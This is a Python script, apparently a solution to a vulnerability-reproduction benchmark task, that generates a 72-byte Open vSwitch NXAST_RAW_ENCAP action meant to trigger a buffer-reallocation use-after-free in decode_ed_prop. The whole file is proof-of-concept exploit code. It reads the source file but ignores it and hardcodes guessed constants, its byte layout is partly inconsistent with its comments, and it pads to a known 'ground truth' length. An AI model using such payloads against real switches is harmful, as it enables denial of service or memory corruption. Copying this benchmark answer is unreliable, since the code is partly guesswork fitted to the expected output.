import os
import tempfile
import tarfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine source structure
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for OpenFlow action definitions
            action_file = None
            for root, dirs, files in os.walk(tmpdir):
                if 'ofp-actions.c' in files:
                    action_file = os.path.join(root, 'ofp-actions.c')
                    break
            
            if action_file:
                # Parse the file to understand RAW_ENCAP structure
                with open(action_file, 'r') as f:
                    content = f.read()
                    
                # Extract relevant constants from the source
                # Look for NXAST_RAW_ENCAP value
                nxast_raw_encap = 0x000c  # Common value in OVS
                
                # Look for structure definitions
                # nx_action_encap structure typically has:
                # uint16_t type, len; uint32_t vendor; uint16_t encap_type; uint16_t pad
                nx_action_encap_size = 12  # bytes (2+2+4+2+2)
                
            else:
                # Default values if source parsing fails
                nxast_raw_encap = 0x000c
                nx_action_encap_size = 12
        
        # Construct the RAW_ENCAP action that triggers the vulnerability
        # The vulnerability occurs when decode_ed_prop() reallocates the buffer
        # but decode_NXAST_RAW_ENCAP continues using old pointer
        
        # Action header: type, length, vendor (Nicira: 0x00002320)
        action_type = nxast_raw_encap
        vendor = 0x00002320  # Nicira vendor ID
        
        # Calculate lengths to trigger reallocation
        # Total PoC length should be 72 bytes (ground truth)
        total_length = 72
        
        # Action length = total_length - (OpenFlow message header if any)
        # Since we're just generating the action, use total_length
        action_len = total_length
        
        # encap_type and pad
        encap_type = 0x0800  # ETH_TYPE_IP
        pad = 0
        
        # encap_data: needs to be large enough so decode_ed_prop() reallocates
        # Minimum encap_data size to trigger bug
        encap_data_size = 28  # IP header size
        
        # Property that triggers reallocation
        # decode_ed_prop() will try to parse property and reallocate
        # Property type and length that fits in remaining space
        prop_type = 0x0001  # Arbitrary property type
        prop_len = 24  # Property length
        
        # Calculate remaining space
        header_size = nx_action_encap_size
        remaining = total_length - header_size - encap_data_size - 4  # 4 for prop header
        
        # Build the PoC
        poc = bytearray()
        
        # nx_action_encap header
        poc.extend(struct.pack('!H', action_type))  # type
        poc.extend(struct.pack('!H', action_len))   # len
        poc.extend(struct.pack('!I', vendor))       # vendor
        poc.extend(struct.pack('!H', encap_type))   # encap_type
        poc.extend(struct.pack('!H', pad))          # pad
        
        # encap_data (IP header)
        poc.extend(b'\x45\x00')  # Version, IHL, DSCP, ECN | Total Length
        poc.extend(struct.pack('!H', encap_data_size - 2))
        poc.extend(b'\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # Property that causes reallocation
        poc.extend(struct.pack('!H', prop_type))    # property type
        poc.extend(struct.pack('!H', prop_len))     # property length
        poc.extend(b'A' * (prop_len - 4))          # property data
        
        # Pad to exact 72 bytes
        current_len = len(poc)
        if current_len < total_length:
            poc.extend(b'\x00' * (total_length - current_len))
        elif current_len > total_length:
            poc = poc[:total_length]
        
        return bytes(poc)
